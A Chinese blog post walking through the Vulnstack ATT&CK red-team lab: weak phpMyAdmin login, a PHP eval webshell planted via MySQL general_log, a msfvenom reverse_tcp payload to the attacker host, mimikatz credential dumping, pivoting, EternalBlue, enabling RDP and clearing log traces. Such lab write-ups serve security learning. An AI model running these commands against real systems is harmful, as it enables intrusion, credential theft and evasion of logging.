<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="𝐴_𝑌𝑢">





<title>ATT&amp;CK—红队评估1 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>



    <link rel="icon" href="/image/favicon.svg">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
<meta name="generator" content="Hexo 6.1.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">𝔸_𝕐𝕌ʹ𝕤 𝔹𝕀💿𝔾</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        文章
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        分类
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        标签
                    </a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">𝔸_𝕐𝕌ʹ𝕤 𝔹𝕀💿𝔾</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">
                        
                            <i class="iconfont icon-archives "></i>
                        
                        
                        
                        
                        文章
                    </a>
                
                    <a class="menu-item" href="/category">
                        
                        
                            <i class="iconfont icon-categorys "></i>
                        
                        
                        
                        分类
                    </a>
                
                    <a class="menu-item" href="/tag">
                        
                        
                        
                            <i class="iconfont icon-tags "></i>
                        
                        
                        标签
                    </a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
    </div>
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a onclick="go_top()">△ 顶部</a>
        <a onclick="go_bottom()">▽ 底部</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "▼ 收起目录"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "▶︎ 展开目录"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ATT&amp;CK—红队评估1</h1>
            
                <div class="post-meta">
                    
                        <!--作者:-->
                        <i class="iconfont icon-user"></i>
                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
                    

                    
                        <span class="post-time">
                        <!--发布时间:-->
                        <i class="iconfont icon-time"></i>
                        <a href="#">2022-05-09&nbsp;&nbsp;21:28:03</a> &nbsp;
                        </span>
                    
                    
                        <span class="post-category">
                        <!--分类:-->
                        <i class="iconfont icon-category"></i>
                            
                                <a href="/categories/ATT-CK%E9%9D%B6%E5%9C%BA/">ATT&CK靶场</a>&nbsp;
                            
                        </span>
                    
                    
                    <span id="/2022/05/09/22-0509-01/" class="leancloud-visitors view" data-flag-title="ATT&amp;CK—红队评估1">
                        <text class="post-meta-item-text">
                            <!--阅读数:-->
                            <i class="iconfont icon-view"></i>
                        </text>
                        
                        <text class="leancloud-visitors-count">加载中</text>
                      </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="靶场环境详解"><a href="#靶场环境详解" class="headerlink" title="靶场环境详解"></a>靶场环境详解</h1><blockquote>
<p>靶场地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>所有靶机密码：hongrisec@2019</p>
</blockquote>
<img src="/2022/05/09/22-0509-01/image-20220509225450243.png" alt="image-20220509225450243" style="zoom:80%;">

<blockquote>
<p>配置靶场ip：</p>
</blockquote>
<ol>
<li><p>把win7网络适配器由NAT模式改为自定义（VMnet10），VMnet10具体配置如下：（用于模拟内网ip）</p>
<img src="/2022/05/09/22-0509-01/image-20220510174309282.png" alt="image-20220510174309282" style="zoom:80%;">
</li>
<li><p>然后给win7添加一张新的网卡，配置成NAT模式（模拟外网ip）</p>
</li>
<li><p>将win2003和win2008的网卡都设置成VMnet10（模拟内网ip）</p>
</li>
<li><p>在win7上面开启phpstudy（phpstudy所在路径：C:\phpStudy\phpStudy.exe）</p>
</li>
<li><p>注意：在登陆域控win2008时，要求我们重新改密码（这里把原来的密码hongrisec@2019改成admin!@#45）</p>
</li>
<li><p>配置完后，win7可以访问外网（百度），但是win2003、win2008都无法访问外网</p>
</li>
</ol>
<p>靶机的具体ip如下：</p>
<table>
<thead>
<tr>
<th align="center">win7（模拟web服务器）</th>
<th align="center">win2003（模拟域成员）</th>
<th align="center">win2008（模拟域控）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">网卡1（VMnet10）：<br>192.168.52.143</td>
<td align="center">网卡（VMnet10）：<br>192.168.52.141</td>
<td align="center">网卡（VMnet10）：<br>192.168.52.138</td>
</tr>
<tr>
<td align="center">网卡2（NAT）：<br>192.168.13.162</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h1 id="打靶过程"><a href="#打靶过程" class="headerlink" title="打靶过程"></a>打靶过程</h1><blockquote>
<p>攻击主机主要使用kali linux，设置为NAT模式，ip：192.168.13.160</p>
</blockquote>
<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫描目标网段，得到web服务器（win7）的ip</p>
<img src="/2022/05/09/22-0509-01/image-20220510181111315.png" alt="image-20220510181111315" style="zoom:80%;">

<p>扫描192.168.13.162开放的端口，开放了80&#x2F;http、3306&#x2F;mysql</p>
<img src="/2022/05/09/22-0509-01/image-20220510181805326.png" alt="image-20220510181805326" style="zoom:80%;">

<p>访问80端口，收集一些可能用到的相关信息</p>
<img src="/2022/05/09/22-0509-01/image-20220510210610580.png" alt="image-20220510210610580" style="zoom:80%;">

<p>最下方发现输入框</p>
<img src="/2022/05/09/22-0509-01/image-20220510181850763.png" alt="image-20220510181850763" style="zoom:80%;">

<p>尝试用户名输入root密码输入root，竟然直接连接成功了</p>
<img src="/2022/05/09/22-0509-01/image-20220510182018136.png" alt="image-20220510182018136" style="zoom:80%;">

<p>然后扫描目录</p>
<img src="/2022/05/09/22-0509-01/image-20220510183726355.png" alt="image-20220510183726355" style="zoom:80%;">

<p>尝试访问phpmyadmin</p>
<img src="/2022/05/09/22-0509-01/image-20220510183838154.png" alt="image-20220510183838154" style="zoom:80%;">

<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>用root和root成功登陆phpmyadmin</p>
<img src="/2022/05/09/22-0509-01/image-20220510183920290.png" alt="image-20220510183920290" style="zoom:80%;">

<h3 id="select-into-outfile写shell"><a href="#select-into-outfile写shell" class="headerlink" title="select into outfile写shell"></a>select into outfile写shell</h3><p>这里我们尝试用into outfile写入一句话木马，首先用<code>show global variables like &#39;%secure%&#39;;show global variables like &#39;%secure%&#39;;</code>查询能否进行写shell，这里<code>secure_file_priv = null</code>是无法进行写shell的，只有<code>secure_file_priv</code>的值为空时才可以进行shell </p>
<img src="/2022/05/09/22-0509-01/image-20220510204312389.png" alt="image-20220510204312389" style="zoom:80%;">

<h3 id="利用全局日志写shell"><a href="#利用全局日志写shell" class="headerlink" title="利用全局日志写shell"></a>利用全局日志写shell</h3><p>虽然上面无法利用select into outfile写shell，但是没有关系，尝试利用全局日志写shell</p>
<p>查看是否开启mysql的日志功能， <code>show variables like &#39;%general%&#39;;</code></p>
<p>这里<code>general_log = OFF</code>，没有开启mysql的日志功能，日志保存的路径为<code>C:\phpStudy\MySQL\data\stu1.log</code></p>
<img src="/2022/05/09/22-0509-01/image-20220510204825605.png" alt="image-20220510204825605" style="zoom:80%;">

<p>执行<code>set global general_log = on;</code>将<code>general_log = OFF</code>改为<code>general_log = on</code>，开启日志功能，开启之后，所有执行的sql语句都会被记录在日志中</p>
<p>然后把原本保存日志的路径进行修改，<code>set global general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39;;</code>，修改为<code>C:\phpStudy\WWW\shell.php</code>，这样就可以解析php一句话</p>
<p>然后再次执行<code>show variables like &#39;%general%&#39;;</code> 即可发现日志已经开启，并且保存文件为shell.php</p>
<img src="/2022/05/09/22-0509-01/image-20220510210902243.png" alt="image-20220510210902243" style="zoom:80%;">

<p>执行sql语句，向日志中写入一句话木马<code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code></p>
<img src="/2022/05/09/22-0509-01/image-20220510205945770.png" alt="image-20220510205945770" style="zoom:80%;">

<p>然后尝试用蚁剑连接</p>
<img src="/2022/05/09/22-0509-01/image-20220510211122755.png" alt="image-20220510211122755" style="zoom:80%;">

<p>连接成功后，虚拟终端执行<code>whoami</code>发现权限还是<code>god\administrator</code>，不是<code>www-data</code>权限</p>
<img src="/2022/05/09/22-0509-01/image-20220510211306909.png" alt="image-20220510211306909" style="zoom:80%;">

<p>注意：最后还要进行日志的痕迹清理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;;  // 恢复原log文件路径    </span><br><span class="line">set global general_log = off;   // 关闭全局日志</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>内网渗透我们可以配合msf或cs进行渗透，由于目前msf接触的更多，这里使用msf</p>
<p>利用msf生成exe木马</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.13.160 -f exe -o msfhack.exe</span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.13.160</span><br><span class="line">set lport 6666 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>将msfhack.exe通过蚁剑上传到目标机器中</p>
<img src="/2022/05/09/22-0509-01/image-20220510214951214.png" alt="image-20220510214951214" style="zoom:80%;">

<p>在虚拟终端中通过<code>start msfhack.exe</code>执行</p>
<img src="/2022/05/09/22-0509-01/image-20220510215114078.png" alt="image-20220510215114078" style="zoom:80%;">

<p>成功监听到</p>
<img src="/2022/05/09/22-0509-01/image-20220511223210598.png" alt="image-20220511223210598" style="zoom:80%;">

<p>执行<code>sysinfo</code>查看目标机器的信息</p>
<img src="/2022/05/09/22-0509-01/image-20220510233644349.png" alt="image-20220510233644349" style="zoom:80%;">

<p>执行getuid得到当前权限</p>
<img src="/2022/05/09/22-0509-01/image-20220510233725601.png" alt="image-20220510233725601" style="zoom:80%;">

<p>判断当前目标机器是不是虚拟机环境下的（判断是否为蜜罐），废话，这里肯定是处于虚拟机中的</p>
<img src="/2022/05/09/22-0509-01/image-20220510234911673.png" alt="image-20220510234911673" style="zoom:80%;">

<h3 id="提权至system权限"><a href="#提权至system权限" class="headerlink" title="提权至system权限"></a>提权至system权限</h3><p>发现是administrator权限，尝试进一步提升至system权限</p>
<p>这里利用msf可以直接用<code>getsystem</code>提权或<code>进程迁移</code>来提权，两个在这里都能成功，这里用<code>进程迁移</code>提权</p>
<img src="/2022/05/09/22-0509-01/image-20220510233937298.png" alt="image-20220510233937298" style="zoom:80%;">

<p>

<img src="/2022/05/09/22-0509-01/image-20220510234105362.png" alt="image-20220510234105362" style="zoom:80%;">

</p><p>提权成功后进行信息收集</p>
<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h4><p>执行<code>shell</code>进入目标命令行（cmd）下（解决乱码<code>chcp 65001</code>）</p>
<p>查看目标是否在多个域中<code>net view /domain</code>，得到目标只在GOD域中</p>
<img src="/2022/05/09/22-0509-01/image-20220510221427064.png" alt="image-20220510221427064" style="zoom:80%;">

<p>查看域内其他用户的主机名<code>net view</code>，得到OWA和ROOT-TVI860UBEH两台主机</p>
<img src="/2022/05/09/22-0509-01/image-20220510221532659.png" alt="image-20220510221532659" style="zoom:80%;">

<p>执行<code>ipconfig /all</code> 得到dns的地址192.168.52.138，一般来说该ip就是域控ip</p>
<img src="/2022/05/09/22-0509-01/image-20220510221833543.png" alt="image-20220510221833543" style="zoom:80%;">

<p>注意：正常来说我们还可以通过nslookup查看判断域控是那台机器，但是这里没有做dns解析，所以看不出来</p>
<h4 id="msf添加静态路由"><a href="#msf添加静态路由" class="headerlink" title="msf添加静态路由"></a>msf添加静态路由</h4><p>查看目标机器所在内网网端信息与公网网端信息<code>run get_local_subnets</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511111156462.png" alt="image-20220511111156462" style="zoom:80%;">

<p>添加静态路由<code>run autoroute -s 192.168.52.0/24</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511111212213.png" alt="image-20220511111212213" style="zoom:80%;">

<p>查看添加的路由</p>
<img src="/2022/05/09/22-0509-01/image-20220511111235145.png" alt="image-20220511111235145" style="zoom:80%;">

<p>然后把meterpreter会话放到后台中</p>
<img src="/2022/05/09/22-0509-01/image-20220511111709498.png" alt="image-20220511111709498" style="zoom:80%;">

<p>查看已经添加的静态路由</p>
<img src="/2022/05/09/22-0509-01/image-20220512132143209.png" alt="image-20220512132143209" style="zoom:80%;">

<p>这样添加完成之后，我们就可以在msf中访问到内网网段中192.168.52.0&#x2F;24的机器了，但是我们的kali机器其他软件还是无法访问到192.168.52.0&#x2F;24网段的机器，所以下面我们配置socks代理</p>
<h4 id="配置socks代理"><a href="#配置socks代理" class="headerlink" title="配置socks代理"></a>配置socks代理</h4><p>添加socks代理，选择对应模块</p>
<img src="/2022/05/09/22-0509-01/image-20220512135443058.png" alt="image-20220512135443058" style="zoom:80%;">

<p>配置模块相关参数</p>
<img src="/2022/05/09/22-0509-01/image-20220512135611501.png" alt="image-20220512135611501" style="zoom:80%;">

<p>kali上配置proxychains</p>
<p><code>vim /etc/proxychains.conf</code></p>
<img src="/2022/05/09/22-0509-01/image-20220512135128743.png" alt="image-20220512135128743" style="zoom:80%;">

<p>

<img src="/2022/05/09/22-0509-01/image-20220512135021796.png" alt="image-20220512135021796" style="zoom:80%;">

</p><p>然后代理msf，我们后续就可以在msf中直接访问到内网网段</p>
<p><code>proxychains msfconsole</code></p>
<h4 id="proxychains代理nmap扫描内网"><a href="#proxychains代理nmap扫描内网" class="headerlink" title="proxychains代理nmap扫描内网"></a>proxychains代理nmap扫描内网</h4><p>当然这里也可以代理nmap扫描内网网段</p>
<p>结果nmap扫描全是问题（这里代理不知道哪里出问题了。。。）</p>
<img src="/2022/05/09/22-0509-01/image-20220512142554943.png" alt="image-20220512142554943" style="zoom:80%;">

<p>后面用proxychains的升级版proxychains4（也就是proxychains-ng），还是不行，出现超时。。。。。</p>
<img src="/2022/05/09/22-0509-01/image-20220512143922123.png" alt="image-20220512143922123" style="zoom:80%;">

<h4 id="基于udp协议扫描内网主机"><a href="#基于udp协议扫描内网主机" class="headerlink" title="基于udp协议扫描内网主机"></a>基于udp协议扫描内网主机</h4><p>基于udp协议发现内网存活主机  <code>use auxiliary/scanner/discovery/udp_probe</code> </p>
<img src="/2022/05/09/22-0509-01/image-20220511111749761.png" alt="image-20220511111749761" style="zoom:80%;">

<p>扫描后发现三台内网主机，其中192168.52.143是已知的内网主机，得到了另外的两台内网主机<code>192.168.52.138</code>、<code>192.168.52.141</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511112023387.png" alt="image-20220511112023387" style="zoom:80%;">

<h4 id="扫描内网主机SMB服务"><a href="#扫描内网主机SMB服务" class="headerlink" title="扫描内网主机SMB服务"></a>扫描内网主机SMB服务</h4><p>使用<code>use auxiliary/scanner/smb/smb_version</code>模块扫描smb服务</p>
<img src="/2022/05/09/22-0509-01/image-20220511114056143.png" alt="image-20220511114056143" style="zoom:80%;">

<p>扫描后，发现两台主机都有开放smb服务，一台主机是2003，另一台是2008</p>
<img src="/2022/05/09/22-0509-01/image-20220511114405528.png" alt="image-20220511114405528" style="zoom:80%;">

<h4 id="扫描永恒之蓝"><a href="#扫描永恒之蓝" class="headerlink" title="扫描永恒之蓝"></a>扫描永恒之蓝</h4><p>使用<code>use auxiliary/scanner/smb/smb_ms17_010</code>扫描内网主机是否存在永恒之蓝，发现两台主机都可能存在永恒之蓝</p>
<img src="/2022/05/09/22-0509-01/image-20220511114629797.png" alt="image-20220511114629797" style="zoom:80%;">

<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h4><p>用mimikatz抓取密码（msf也就是kiwi模块）这里直接得到了当前机器用户的密码：hongrisec@2019</p>
<img src="/2022/05/09/22-0509-01/image-20220510234532382.png" alt="image-20220510234532382" style="zoom:80%;">

<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>上面发现了<code>192.168.52.138</code>、<code>192.168.52.141</code>两台主机，另外还得到了当前内网主机的密码，尝试利用psexec进行横向移动，当然也可以利用永恒之蓝，这里使用psexec</p>
<p>使用<code>use exploit/windows/smb/psexec</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511124335193.png" alt="image-20220511124335193" style="zoom:80%;">

<p>

<img src="/2022/05/09/22-0509-01/image-20220511124410937.png" alt="image-20220511124410937" style="zoom:80%;">

</p><p>

<img src="/2022/05/09/22-0509-01/image-20220511124434083.png" alt="image-20220511124434083" style="zoom:80%;">

</p><p>

<img src="/2022/05/09/22-0509-01/image-20220511124508610.png" alt="image-20220511124508610" style="zoom:80%;">

</p><p>一顿操作下来，利用失败了。。。。。（没搞清楚啥原因）</p>
<p>竟然这样，那么利用永恒之蓝</p>
<h4 id="ms-17-010"><a href="#ms-17-010" class="headerlink" title="ms-17-010"></a>ms-17-010</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2022/05/09/22-0509-01/image-20220512144508863.png" alt="image-20220512144508863" style="zoom:80%;">

<p>FAIL了两次，第三次成功了</p>
<img src="/2022/05/09/22-0509-01/image-20220512144602732.png" alt="image-20220512144602732" style="zoom:80%;">

<p>这里永恒之蓝利用成功之后，进行可以进入shell中打开3389端口，执行如下命令打开3389端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>注意：这里提前手动把域控的防火墙关闭之后，永恒之蓝才利用成功的，实际没啥用，一般防火墙都是开放的。。。这里用的payload是正向连接到域控<code>windows/x64/meterpreter/bind_tcp</code>，因为kali的msf设置了静态路由，所以可以直接访问到域控，但是由于域控开启了防火墙所以正向payload肯定会被拦截的。。。这里如果尝试换成反向连接绕过防火墙，使用<code>payload/windows/x64/meterpreter/reverse_tcp </code>，关闭了防火墙也会失败。。。（没搞懂），这里永恒之蓝的利用很玄学，有的时候全部防火墙关闭后，利用半天也不行。。。</p>
<p>如果利用不成功的话，尝试用win7和域控建立匿名连接，然后再次尝试，蚁剑中执行<code>net use \\192.168.52.138</code>建立匿名连接</p>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/issues/11691">https://github.com/rapid7/metasploit-framework/issues/11691</a></p>
<img src="/2022/05/09/22-0509-01/image-20220512150927204.png" alt="image-20220512150927204" style="zoom:80%;">

<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>该靶场难度相对简单，但是总会遇到各种问题，特别是在内网环境中，各种报错，各种踩坑，proxychains代理msf一直无法成功，感觉有点奇怪。。。。除了上面的方法外，该靶场中横向移动的方法还有好多，vmi，哈希传递等应该都可以。</p>

        </div>		
		
        <section class="post-tags">
            <div>
                <span>标签:</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="/">
                    <i class="iconfont icon-home"></i>
                    主页
                </a>
                <span>· </span>
                <a href="javascript:window.history.back();">
                    <i class="iconfont icon-back"></i>
                    返回
                </a>
                
                
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/05/10/22-0510-01/">中间件漏洞</a>
            
            
            <a class="next" rel="next" href="/2022/05/07/22-0507-02/">博客多余图片处理</a>
            
        </section>
        <br>
        
            <section id="comments" class="comments">
              <style>
                  .comments{ margin-top: 30px;}
                  .v .vlist .vcard .vcontent {padding-top: 0;}
                  .vcontent p { color:grey; margin-bottom: 10px;}
                  .v * {line-height: normal;}
                  .v .vwrap  {border-radius: 0px; padding: 10px;}
                  .v .vbtn {border-radius: 0px;}
                  .v code, .v pre {border-radius: 0px;}
                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
                  .v .vlist .vcard {padding-top: 0;}
                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
              </style>
              <div class="valine_comment"></div>
<!--载入js，在</body>之前插入即可-->
<!--Leancloud 操作库:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine 的核心代码库-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
        placeholder: '想对作者说点什么...',
        notify: 'false',
        verify: 'false',
        avatar: 'retro',
        visitor: 'true'
    });
</script>
            </section>
        
    </article>
</div>



<style>

.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }

</style>
        </div>
        <footer id="footer" class="footer">

 <div class="copyright">

 <span>© 𝐴_𝑌𝑢

 <!-- 访客数量 -->

 

 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span class="site-uv">
    | 总访客量:
    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
</span>&nbsp;


<span class="site-pv">
    | 总访问量:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


 

 </span>

 </div>

</footer>
    </div>
</body>
</html>


<!--动态线条背景-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>